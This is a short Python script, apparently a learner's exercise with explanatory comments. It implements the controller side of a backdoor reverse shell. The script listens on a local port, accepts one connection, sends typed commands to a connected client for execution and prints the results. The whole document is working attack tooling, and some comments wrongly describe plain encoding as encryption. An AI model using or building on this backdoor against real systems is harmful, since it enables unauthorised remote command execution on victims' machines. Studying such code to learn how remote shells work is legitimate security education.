#! /bin/python3

import socket #importing the socket library which creates that network connection.


HOST = "127.0.0.1" #host ip address
PORT = 9999 #port we want to connect to
BUFFER = 2024 #Buffer size, tells you how many byts the server will be reading and writing in one attempt. 
SEP = "<sep>" #Seperation between commmands and outputs. (prettier)

def backdoor_comms(): 
    cwd = conn.recv(BUFFER).decode() #Gets the current working directory of the client and decodes it, since we encrypted and sent it from the client to the server. 
    while True: 
        command = input(f"[SHELL] {cwd}$> ") #prompts the server opperator or myself in this case what i would like to do
        command = command.strip(" ") #makes it look nice
        conn.send(command.encode())  #sends the command encrypted to the client through open connection

        output = conn.recv(BUFFER).decode() #the output from the command executed by me will return a response and decode it
        results, cwd = output.split(SEP)  #returns the results and cwd and splits them by using SEP
        print(results) #print results


def main(): 
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #creates a new TCP socket... the AF INET = refers to IPv4,,, socket.SOCK_STREAM refers to a TCP connection
    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #this helps avoid errors, basically to what i learned it sets a socket option where the server is allowed to reuse the address if the server restarts.

    server_sock.bind((HOST, PORT)) #listens from the port and host provided
    server_sock.listen(1)  #tells the server created to start listening for incoming connections. the 1 indicates only one connection at a time, not true or false. 
    global conn #declares that conn is global variable so it can be modified later on. 
    conn, addr = server_sock.accept()  #accepts incoming connection // the conn means that it allwos the communication with the client. Addr is the connected client ip address and port. 
    backdoor_comms() #starts the backdoor comms function, and starts the loop where it wants my input

main() #initiates the server
